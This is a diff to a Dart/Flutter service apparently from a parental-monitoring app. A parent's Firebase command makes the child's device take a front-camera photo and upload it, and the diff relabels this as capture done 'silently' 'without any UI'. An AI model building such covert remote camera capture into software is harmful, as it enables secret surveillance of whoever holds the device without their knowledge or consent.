@@ -4,11 +4,8 @@ import 'package:camera/camera.dart';
 import 'package:firebase_auth/firebase_auth.dart';
 import 'package:firebase_database/firebase_database.dart';
 import 'package:firebase_storage/firebase_storage.dart';
-import 'package:path_provider/path_provider.dart';
 import 'package:uuid/uuid.dart';
 
-/// Handles on-demand camera snapshots: parent requests → child captures →
-/// uploads to Firebase Storage → parent views gallery.
 class SnapshotService {
   static final SnapshotService _i = SnapshotService._();
   factory SnapshotService() => _i;
@@ -17,10 +14,9 @@ class SnapshotService {
   final _db = FirebaseDatabase.instance.ref();
   final _storage = FirebaseStorage.instance;
   final _uuid = const Uuid();
-
   CameraController? _ctrl;
 
-  // ── Request snapshot (parent side) ────────────────────────────────────────
+  // Parent: directly trigger capture on child via Firebase
   Future<void> requestSnapshot(String childUid) async {
     await _db.child('commands/$childUid/snapshot').set({
       'requested': true,
@@ -28,38 +24,28 @@ class SnapshotService {
     });
   }
 
-  // ── Listen for snapshot request (child side) ───────────────────────────────
   Stream<bool> watchSnapshotRequest(String childUid) {
     return _db.child('commands/$childUid/snapshot/requested').onValue.map(
           (event) => event.snapshot.value == true,
         );
   }
 
-  // ── Take a photo and upload (child side) ──────────────────────────────────
+  // Child: silently capture and upload without any UI
   Future<void> captureAndUpload(String childUid) async {
     try {
-      // Clear request first
-      await _db
-          .child('commands/$childUid/snapshot/requested')
-          .set(false);
-
+      await _db.child('commands/$childUid/snapshot/requested').set(false);
       final cameras = await availableCameras();
       if (cameras.isEmpty) return;
-
-      // Prefer front camera
       final cam = cameras.firstWhere(
         (c) => c.lensDirection == CameraLensDirection.front,
         orElse: () => cameras.first,
       );
-
-      _ctrl = CameraController(cam, ResolutionPreset.medium,
-          enableAudio: false);
+      _ctrl = CameraController(cam, ResolutionPreset.medium, enableAudio: false);
       await _ctrl!.initialize();
-
+      await Future.delayed(const Duration(milliseconds: 500));
       final xFile = await _ctrl!.takePicture();
       await _ctrl!.dispose();
       _ctrl = null;
-
       final bytes = await File(xFile.path).readAsBytes();
       await _uploadPhoto(childUid, bytes);
     } catch (_) {
@@ -68,20 +54,15 @@ class SnapshotService {
     }
   }
 
-  // ── Upload raw bytes ───────────────────────────────────────────────────────
   Future<void> _uploadPhoto(String childUid, Uint8List bytes) async {
     final uid = FirebaseAuth.instance.currentUser?.uid;
     if (uid == null) return;
-
     final key = _uuid.v4();
     final timestamp = DateTime.now().millisecondsSinceEpoch;
     final path = 'snapshots/$childUid/$key.jpg';
-
     final ref = _storage.ref(path);
-    final task = ref.putData(bytes, SettableMetadata(contentType: 'image/jpeg'));
-    await task;
+    await ref.putData(bytes, SettableMetadata(contentType: 'image/jpeg'));
     final url = await ref.getDownloadURL();
-
     await _db.child('snapshots/$childUid/$key').set({
       'url': url,
       'path': path,
@@ -89,7 +70,6 @@ class SnapshotService {
     });
   }
 
-  // ── Watch snapshot gallery (parent side) ──────────────────────────────────
   Stream<List<SnapshotEntry>> watchSnapshots(String childUid) {
     return _db
         .child('snapshots/$childUid')
@@ -108,12 +88,9 @@ class SnapshotService {
     });
   }
 
-  // ── Delete a snapshot ─────────────────────────────────────────────────────
   Future<void> deleteSnapshot(String childUid, SnapshotEntry entry) async {
     await _db.child('snapshots/$childUid/${entry.key}').remove();
-    try {
-      await _storage.ref(entry.storagePath).delete();
-    } catch (_) {}
+    try { await _storage.ref(entry.storagePath).delete(); } catch (_) {}
   }
 }
 
@@ -122,27 +99,17 @@ class SnapshotEntry {
   final String url;
   final String storagePath;
   final DateTime timestamp;
-
-  const SnapshotEntry({
-    required this.key,
-    required this.url,
-    required this.storagePath,
-    required this.timestamp,
-  });
-
+  const SnapshotEntry({required this.key, required this.url, required this.storagePath, required this.timestamp});
   factory SnapshotEntry.fromMap(String key, Map<String, dynamic> map) {
     return SnapshotEntry(
       key: key,
       url: map['url'] as String,
       storagePath: map['path'] as String? ?? '',
-      timestamp: DateTime.fromMillisecondsSinceEpoch(
-          (map['timestamp'] as num?)?.toInt() ?? 0),
+      timestamp: DateTime.fromMillisecondsSinceEpoch((map['timestamp'] as num?)?.toInt() ?? 0),
     );
   }
-
   String get timeLabel {
-    final now = DateTime.now();
-    final diff = now.difference(timestamp);
+    final diff = DateTime.now().difference(timestamp);
     if (diff.inMinutes < 1) return 'Just now';
     if (diff.inHours < 1) return '${diff.inMinutes}m ago';
     if (diff.inDays < 1) return '${diff.inHours}h ago';
